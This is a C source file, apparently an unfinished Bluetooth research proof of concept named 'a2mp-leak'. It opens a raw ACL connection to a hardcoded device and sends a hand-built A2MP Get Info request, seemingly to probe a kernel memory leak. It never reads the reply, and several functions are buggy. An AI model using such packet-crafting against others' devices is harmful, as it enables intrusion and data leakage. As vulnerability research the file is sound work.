#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <assert.h>


#include <errno.h>
#include <fcntl.h>

#include <sys/uio.h>


#include <sys/types.h>
#include <sys/socket.h>
#include <ctype.h>

#include <sys/ioctl.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>



/**
*	Using bluetooth commands line and wiresharks to interact
*	and learn more about the protocols and all the details.
*	gcc -g -o a2mp-leak a2mp-leak.c -lbluetooth; sudo ./a2mp-leak
**/


/** CRC table for the CRC-16. The poly is 0x8005 (x^16 + x^15 + x^2 + 1) */
uint16_t const crc16_table[256] = {
	0x0000, 0xC0C1, 0xC181, 0x0140, 0xC301, 0x03C0, 0x0280, 0xC241,
	0xC601, 0x06C0, 0x0780, 0xC741, 0x0500, 0xC5C1, 0xC481, 0x0440,
	0xCC01, 0x0CC0, 0x0D80, 0xCD41, 0x0F00, 0xCFC1, 0xCE81, 0x0E40,
	0x0A00, 0xCAC1, 0xCB81, 0x0B40, 0xC901, 0x09C0, 0x0880, 0xC841,
	0xD801, 0x18C0, 0x1980, 0xD941, 0x1B00, 0xDBC1, 0xDA81, 0x1A40,
	0x1E00, 0xDEC1, 0xDF81, 0x1F40, 0xDD01, 0x1DC0, 0x1C80, 0xDC41,
	0x1400, 0xD4C1, 0xD581, 0x1540, 0xD701, 0x17C0, 0x1680, 0xD641,
	0xD201, 0x12C0, 0x1380, 0xD341, 0x1100, 0xD1C1, 0xD081, 0x1040,
	0xF001, 0x30C0, 0x3180, 0xF141, 0x3300, 0xF3C1, 0xF281, 0x3240,
	0x3600, 0xF6C1, 0xF781, 0x3740, 0xF501, 0x35C0, 0x3480, 0xF441,
	0x3C00, 0xFCC1, 0xFD81, 0x3D40, 0xFF01, 0x3FC0, 0x3E80, 0xFE41,
	0xFA01, 0x3AC0, 0x3B80, 0xFB41, 0x3900, 0xF9C1, 0xF881, 0x3840,
	0x2800, 0xE8C1, 0xE981, 0x2940, 0xEB01, 0x2BC0, 0x2A80, 0xEA41,
	0xEE01, 0x2EC0, 0x2F80, 0xEF41, 0x2D00, 0xEDC1, 0xEC81, 0x2C40,
	0xE401, 0x24C0, 0x2580, 0xE541, 0x2700, 0xE7C1, 0xE681, 0x2640,
	0x2200, 0xE2C1, 0xE381, 0x2340, 0xE101, 0x21C0, 0x2080, 0xE041,
	0xA001, 0x60C0, 0x6180, 0xA141, 0x6300, 0xA3C1, 0xA281, 0x6240,
	0x6600, 0xA6C1, 0xA781, 0x6740, 0xA501, 0x65C0, 0x6480, 0xA441,
	0x6C00, 0xACC1, 0xAD81, 0x6D40, 0xAF01, 0x6FC0, 0x6E80, 0xAE41,
	0xAA01, 0x6AC0, 0x6B80, 0xAB41, 0x6900, 0xA9C1, 0xA881, 0x6840,
	0x7800, 0xB8C1, 0xB981, 0x7940, 0xBB01, 0x7BC0, 0x7A80, 0xBA41,
	0xBE01, 0x7EC0, 0x7F80, 0xBF41, 0x7D00, 0xBDC1, 0xBC81, 0x7C40,
	0xB401, 0x74C0, 0x7580, 0xB541, 0x7700, 0xB7C1, 0xB681, 0x7640,
	0x7200, 0xB2C1, 0xB381, 0x7340, 0xB101, 0x71C0, 0x7080, 0xB041,
	0x5000, 0x90C1, 0x9181, 0x5140, 0x9301, 0x53C0, 0x5280, 0x9241,
	0x9601, 0x56C0, 0x5780, 0x9741, 0x5500, 0x95C1, 0x9481, 0x5440,
	0x9C01, 0x5CC0, 0x5D80, 0x9D41, 0x5F00, 0x9FC1, 0x9E81, 0x5E40,
	0x5A00, 0x9AC1, 0x9B81, 0x5B40, 0x9901, 0x59C0, 0x5880, 0x9841,
	0x8801, 0x48C0, 0x4980, 0x8941, 0x4B00, 0x8BC1, 0x8A81, 0x4A40,
	0x4E00, 0x8EC1, 0x8F81, 0x4F40, 0x8D01, 0x4DC0, 0x4C80, 0x8C41,
	0x4400, 0x84C1, 0x8581, 0x4540, 0x8701, 0x47C0, 0x4680, 0x8641,
	0x8201, 0x42C0, 0x4380, 0x8341, 0x4100, 0x81C1, 0x8081, 0x4040
};

static inline uint16_t crc16_byte(uint16_t crc, const uint8_t data)
{
	return (crc >> 8) ^ crc16_table[(crc ^ data) & 0xff];
}
/**
 * crc16 - compute the CRC-16 for the data buffer
 * @crc:	previous CRC value
 * @buffer:	data pointer
 * @len:	number of bytes in the buffer
 *
 * Returns the updated CRC value.
 */
uint16_t crc16(uint16_t crc, uint8_t const *buffer, size_t len)
{
	while (len--)
		crc = crc16_byte(crc, *buffer++);
	return crc;
}


#define DELL_BD_ADDR "2C:6F:C9:50:B2:92"
#define BD_NAME_LEN 100
static char *default_bd_addr  = DELL_BD_ADDR;
static char *bd_addr = NULL;

#define SUCCESS (0)
#define FAILURE (-1)

#define handle_error(msg) \
           do { perror(msg); exit(FAILURE); } while (0)


static void usage(char *progname)
{
	printf("%s bd_addr\n", progname);
	exit(SUCCESS);
}

static void setup_args(int argc, char *argv[])
{
	if (argc == 2)
		bd_addr = argv[1];
	else
		bd_addr = default_bd_addr;
}

static void get_bd_name(const char *bd_addr)
{
	char bdname[BD_NAME_LEN + 1];

}

static void bt_contro_info_print(struct hci_dev_info *hdev_info)
{
	if (!hdev_info)
		return;

	printf("BT controller name: 	%s\n", hdev_info->name);
	printf("BT system device id:	%d\n", hdev_info->dev_id);
	printf("BT controller address: 	%s\n", batostr((const bdaddr_t*)&hdev_info->bdaddr));
}

static struct hci_dev_info *bt_contr_info_get(const int sockfd)
{
	struct hci_dev_info *hdev_info = NULL;
	int ret = 0;

	hdev_info = malloc(sizeof(*hdev_info));
	if (!hdev_info)
		handle_error("get_bd_info | malloc");

	memset(hdev_info, 0x0, sizeof(struct hci_dev_info));

	ret = ioctl(sockfd, HCIGETDEVINFO, (char*)hdev_info);

	if (ret < 0)
		handle_error("get_bd_info");

	return (hdev_info);
}

static void bt_contr_info_destroy(struct hci_dev_info *hdev_info)
{
	if (!hdev_info) {
		puts("bd_contr_info_destroys: NULL pointer\n");
		exit(FAILURE);
	}

	free(hdev_info);
	hdev_info = NULL;
}

static int hci_sock_init()
{
	struct sockaddr_hci hci_addr;
	int hci_sock_fd = 0, ret = 0;

	hci_sock_fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_HCI);
	if (hci_sock_fd < 0)
		handle_error("hci_sock_init");

	memset(&hci_addr, 0x0, sizeof (struct sockaddr_hci));

	hci_addr.hci_family = AF_BLUETOOTH;
	hci_addr.hci_dev	= 0;

	ret = bind(hci_sock_fd, (const struct sockaddr*) &hci_addr, 
			sizeof(struct sockaddr_hci));

	if (ret < 0)
		handle_error("hci_sock_init");

	return hci_sock_fd;

}

static void hci_sock_destroy (int sock_fd)
{
	if (close(sock_fd) == -1)
		handle_error("hci_sock_destroy");
}


static int l2cap_sock_init(bdaddr_t *local_ba)
{
	struct sockaddr_l2 l2sock_addr;
	int l2_sock_fd = 0, ret = 0;

	l2_sock_fd = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);
	if (l2_sock_fd < 0)
		handle_error("l2cap_sock_init");

	memset(&l2sock_addr, 0x0, sizeof(struct sockaddr_l2));
	l2sock_addr.l2_family = AF_BLUETOOTH;
	memcpy(&l2sock_addr.l2_bdaddr, local_ba, sizeof(bdaddr_t));

	/**
	printf("LOCAL BT ADDRESS BOUND TO L2CAP: %s\n", 
							batostr(&l2sock_addr.l2_bdaddr));
	**/
	ret = bind(l2_sock_fd, (struct sockaddr *)&l2sock_addr, 
										sizeof(l2sock_addr));
	if (ret < 0)
		handle_error("l2cap_sock_init");

	return l2_sock_fd;
}

static void l2cap_sock_destroy(int sock_fd)
{
	if (close(sock_fd) == -1)
		handle_error("l2cap_sock_destroy");
}

#define ERROR_ARRAY_LEN 1
#define BD_ADDR_NONE 0
static char *error_strings[ERROR_ARRAY_LEN] = {
				[BD_ADDR_NONE] = "No BD_ADDR provided",
};

static void code_to_errmesg(unsigned char code)
{
	if (code >= ERROR_ARRAY_LEN)
		handle_error("code_to_errmesg");
	printf("%s\n", error_strings[code]);
}

static int l2cap_sock_connect(int sock_fd, bdaddr_t *remote_ba)
{
	struct sockaddr_l2 l2sock_addr;
	int ret = 0;

	if (!remote_ba) {
		code_to_errmesg(BD_ADDR_NONE);
		return (FAILURE);
	}

	memset(&l2sock_addr, 0x0, sizeof(l2sock_addr));

	l2sock_addr.l2_family = AF_BLUETOOTH;
	memcpy(&l2sock_addr.l2_bdaddr, remote_ba, sizeof(bdaddr_t));

	ret = connect(sock_fd, (struct sockaddr *)&l2sock_addr, sizeof(l2sock_addr));
	if (ret < 0) {
		perror("l2cap_sock_connect");
		return (FAILURE);
	}

}

#define BUFF_LEN 44
static void l2cap_echo_command_req_resp(int sock_fd)
{
	char send_buff[BUFF_LEN];
	char recv_buff[BUFF_LEN];
	l2cap_cmd_hdr *send_cmd;
	l2cap_cmd_hdr *recv_cmd;
	int ret = 0, ident = 0x20;

	memset(&send_buff[0], 0x0, sizeof(send_buff));
	memset(&recv_buff[0], 0x0, sizeof(recv_buff));

	send_cmd = (l2cap_cmd_hdr *)send_buff;
	send_cmd->ident = ident;
	send_cmd->len   = htobs(BUFF_LEN - L2CAP_CMD_HDR_SIZE);
	send_cmd->code  = L2CAP_ECHO_REQ;

	ret = send(sock_fd, send_buff, sizeof(send_buff), 0);
	if (ret < 0)
		goto error;

	printf("[***] ECHO packet sent\n");

	recv_loop:
	
	ret = recv(sock_fd, recv_buff, sizeof(recv_buff), 0);
	if (ret < 0)
		goto error;

	recv_cmd = (l2cap_cmd_hdr *)recv_buff;
	recv_cmd->len = btohs(recv_cmd->len);

	if (recv_cmd->code != L2CAP_ECHO_RSP)
		goto recv_loop;

	if (recv_cmd->ident != ident)
		goto packet_error;

	if (recv_cmd->len != (BUFF_LEN - L2CAP_CMD_HDR_SIZE))
		goto packet_error;

	printf("[***] ECHO RESPONSE packet received\n");

	return;
	error:
		handle_error("l2cap_echo_command_req_resp");
	packet_error:
		handle_error("l2cap_echo_command_req_resp: corrupted packet");
}

static void l2cap_information_req_resp(int sock_fd)
{
	char send_buff[L2CAP_CMD_HDR_SIZE + L2CAP_INFO_REQ_SIZE];
	char recv_buff[BUFF_LEN];
	l2cap_cmd_hdr *send_cmd;
	l2cap_cmd_hdr *recv_cmd;
	l2cap_info_req *info_req;
	l2cap_info_rsp *info_rsp;
	int ret = 0, ident = 0x30;

	memset(&send_buff[0], 0x0, sizeof(send_buff));
	memset(&recv_buff[0], 0x0, sizeof(recv_buff));

	send_cmd = (l2cap_cmd_hdr *)send_buff;
	send_cmd->code 	= L2CAP_INFO_REQ;
	send_cmd->ident = ident;
	send_cmd->len 	= htobs(L2CAP_INFO_REQ_SIZE);

	info_req = (l2cap_info_req *)(send_buff + L2CAP_CMD_HDR_SIZE); 
	info_req->type = L2CAP_CONF_MTU;

	ret = send(sock_fd, send_buff, sizeof(send_buff), 0);
	if (ret < 0)
		goto error;

	printf("[***] INFO REQUEST packet sent\n");

	recv_loop:
	ret = recv(sock_fd, recv_buff, sizeof(recv_buff), 0);
	if (ret < 0)
		goto error;

	recv_cmd = (l2cap_cmd_hdr *)recv_buff;

	if (recv_cmd->code != L2CAP_INFO_RSP || recv_cmd->ident != ident)
		goto recv_loop;

	printf("recv_cmd->code  : 0x%x\n", recv_cmd->code);
	printf("recv_cmd->ident : 0x%x\n", recv_cmd->ident);

	info_rsp = (l2cap_info_rsp *)(recv_buff + L2CAP_CMD_HDR_SIZE);

	assert(info_rsp->type == L2CAP_CONF_MTU);

	printf("[***] INFO RESPONSE packet received\n");

	return;
	error:
		handle_error("l2cap_information_req_resp");
	packet_error:
		handle_error("l2cap_echo_command_req_resp: corrupted packet");
}


struct a2mp_hdr {
	uint8_t		code;
	uint8_t		ident;
	uint16_t	len;
} __attribute__ ((packed));
#define A2MP_HDR_SIZE 4

struct a2mp_info_req {
	uint8_t		id;
} __attribute__ ((packed));

#define A2MP_INFO_REQ		0x06
#define A2MP_INFO_RSP		0x07

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif
 
static char* l2cap_a2mp_getinfo_req_create(int *pkt_len)
{
	char *send_buff = NULL;
	l2cap_hdr *l2_header;
	struct a2mp_hdr *send_cmd;
	struct a2mp_info_req *info_req;
	int ret = 0, ident = 0x40;
	int reqbuff_sz = L2CAP_HDR_SIZE + 2 + A2MP_HDR_SIZE + sizeof(struct a2mp_info_req) + 2;
	uint16_t our_fcs = 0x0;
	uint16_t *fcs_ptr = NULL;

	send_buff = malloc(reqbuff_sz);
	if (!send_buff)
		handle_error("l2cap_a2mp_getinfo_req_create: malloc");

	memset(send_buff, 0x0, reqbuff_sz);

	l2_header = (l2cap_hdr *)send_buff;
	l2_header->len = htobs(2 + A2MP_HDR_SIZE + sizeof(struct a2mp_info_req) + 2);
	l2_header->cid = 0x3;

	send_cmd = (struct a2mp_hdr *)(send_buff  + L2CAP_HDR_SIZE + 2);
	send_cmd->code 	= A2MP_INFO_REQ;
	send_cmd->ident = ident;
	send_cmd->len 	= htobs(sizeof(struct a2mp_info_req)); 

	info_req = (struct a2mp_info_req *)(send_buff + L2CAP_HDR_SIZE  + 2 + A2MP_HDR_SIZE);
	info_req->id = 40;

	our_fcs = crc16(0, send_buff, (reqbuff_sz - 2));

	fcs_ptr = (uint16_t *)(send_buff + (reqbuff_sz - 2));
	*fcs_ptr = our_fcs;

	printf("our_fcs : 0x%x\n", our_fcs);


	*pkt_len = reqbuff_sz;
	return send_buff;
}

static char* l2cap_echo_command_req_create(int *pkt_len)
{
	char *send_buff = NULL;
	l2cap_hdr *l2_header;
	l2cap_cmd_hdr *send_cmd;
	l2cap_cmd_hdr *recv_cmd;
	int ret = 0, ident = 0x20;

	send_buff = malloc(BUFF_LEN);
	if (!send_buff)
		handle_error("l2cap_echo_command_req_create: malloc");

	memset(&send_buff[0], 0x0, sizeof(send_buff));

	l2_header = (l2cap_hdr *)send_buff;
	l2_header->len = htobs(BUFF_LEN - L2CAP_HDR_SIZE);
	l2_header->cid = 0x1;

	send_cmd = (l2cap_cmd_hdr *)(send_buff + L2CAP_HDR_SIZE);
	send_cmd->ident = ident;
	send_cmd->len   = htobs(BUFF_LEN - L2CAP_HDR_SIZE - L2CAP_CMD_HDR_SIZE);
	send_cmd->code  = L2CAP_ECHO_REQ;

	*pkt_len = BUFF_LEN;
	return send_buff;

}

static void hci_cmd_inquiry_remote_device(unsigned int hci_dev_id)
{
	inquiry_info *inq_info = NULL;
	unsigned char num_resps = 0;
	unsigned char inq_length = 2; 
	unsigned char lap_iac[] = {0x33, 0x8b, 0x9e};

	int hci_dev = 0, flags = 0, ret = 0;

	hci_dev = hci_open_dev(hci_dev_id);
	if (hci_dev < 0)
		goto no_device;

	ret = hci_inquiry(hci_dev_id, inq_length, num_resps, lap_iac, &inq_info, 
						flags | IREQ_CACHE_FLUSH);
	if (ret < 0)
		goto inq_error;

	
	
	bt_free(inq_info);
	hci_close_dev(hci_dev);


	return;
	no_device:
		handle_error("hci_cmd_inquiry_remote_device: No device");
	inq_error:
		handle_error("hci_cmd_inquiry_remote_device: hci_inquiry");
}

static int hci_command_create_connection(unsigned int hci_dev_id, int *out_fd)
{
	int hci_dev_fd = 0, flags = 0, ret = 0;
	bdaddr_t remote_ba;
	uint16_t handle = 0;
	struct hci_dev_info di;
	struct hci_version version;

	hci_dev_fd = hci_open_dev(hci_dev_id);
	if (hci_dev_fd < 0)
		goto no_device;

	str2ba(bd_addr, &remote_ba);

	ret = hci_devinfo(hci_dev_id, &di);
	if (ret < 0)
		goto devinfo_err;

	ret = hci_create_connection(hci_dev_fd, &remote_ba, 
								htobs(di.pkt_type & ACL_PTYPE_MASK), 
								0, 0x1, &handle, 25000);
	if (ret < 0)
		goto connect_err;

	sleep(1);

	/**
	ret = hci_read_remote_version(hci_dev_fd, handle, &version, 20000);
	if (ret < 0)
		goto read_remt_err;

	hci_close_dev(hci_dev_fd);

	printf("GOT Handle %d for remote connection\n", handle);
	**/

	*out_fd = hci_dev_fd;

	return handle;
	no_device:
		handle_error("hci_command_create_connection: No device");
	inq_error:
		handle_error("hci_command_create_connection: hci_inquiry");
	devinfo_err:
		handle_error("hci_command_create_connection: hci_devinfo");
	connect_err:
		handle_error("hci_command_create_connection: can't create acl connection");
	read_remt_err:
		handle_error("hci_command_create_connection: read_remote_version");
}

static int hci_send_acl_data_pkts(int dd, int handle, uint8_t plen, void *param)
{
	uint8_t type = HCI_ACLDATA_PKT;
	hci_acl_hdr acl_hdr;
	struct iovec iv[3];
	int ivn;


	memset(&acl_hdr, 0x0, sizeof(hci_acl_hdr));
	acl_hdr.handle = handle;
	acl_hdr.dlen   = plen;

	iv[0].iov_base = &type;
	iv[0].iov_len  = 1;
	iv[1].iov_base = &acl_hdr;
	iv[1].iov_len  = HCI_ACL_HDR_SIZE;
	ivn = 2;

	if (plen) {
		iv[2].iov_base = param;
		iv[2].iov_len  = plen;
		ivn = 3;
	}

	while (writev(dd, iv, ivn) < 0) {
		if (errno == EAGAIN || errno == EINTR)
			continue;
		return -1;
	}
	return 0;
}

static void hci_acl_send_l2cap_packet(unsigned int hci_dev_id)
{

	int hci_dev_fd = 0, l2cap_pkt_len = 0, handle = 0, ret = 0;
	char *l2cap_pkt = NULL;

	handle = hci_command_create_connection(hci_dev_id, &hci_dev_fd);

	
	l2cap_pkt = l2cap_a2mp_getinfo_req_create(&l2cap_pkt_len);
	printf("Created L2CAP packet of length : %d\n", l2cap_pkt_len);
	
	/**

	l2cap_pkt = l2cap_echo_command_req_create(&l2cap_pkt_len);

	**/

	
	ret = hci_send_acl_data_pkts(hci_dev_fd, handle, l2cap_pkt_len, l2cap_pkt);
	if (ret < 0)
		goto snd_error;

	

	hci_close_dev(hci_dev_fd);
	free(l2cap_pkt);

	return;
	snd_error:
		handle_error("hci_acl_send_l2cap_packet: send l2cap");
}

static void l2cap_sock_connect_test(int sock_fd)
{
	int ret = 0;
	bdaddr_t remote_ba;

	str2ba(bd_addr, &remote_ba);

	ret = l2cap_sock_connect(sock_fd, &remote_ba);
	if (ret == FAILURE)
		puts("l2cap_sock_connect_test FAILED\n");

}

int main(int argc, char *argv[])
{

	int hci_sock_fd = 0, l2_sock_fd = 0;
	struct hci_dev_info *bt_contr_info = NULL;
	bdaddr_t local_ba;
	char *lba = "34:68:95:31:AF:88";
	unsigned int hci_dev_id = 0;

	setup_args(argc, argv);

	printf("[***] Targeting BD_ADDR: %s\n\n", bd_addr);

	/**

	hci_sock_fd =  hci_sock_init();

	printf("Created HCI_SOCK FD : %d\n", hci_sock_fd);

	bt_contr_info = bt_contr_info_get(hci_sock_fd);
	bt_contro_info_print(bt_contr_info);

	**/


	str2ba(lba, &local_ba);
	//l2_sock_fd = l2cap_sock_init(&local_ba);


	hci_acl_send_l2cap_packet(hci_dev_id);

	//l2cap_sock_connect_test(l2_sock_fd);

	//hci_command_create_connection(hci_dev_id);

	//l2cap_echo_command_req_resp(l2_sock_fd);
	//l2cap_information_req_resp(l2_sock_fd);

	//l2cap_a2mp_getinfo_req_resp(l2_sock_fd);

	//bt_contr_info_destroy(bt_contr_info);

	//l2cap_sock_destroy(l2_sock_fd);
	//hci_sock_destroy(hci_sock_fd);

	return (SUCCESS);
}
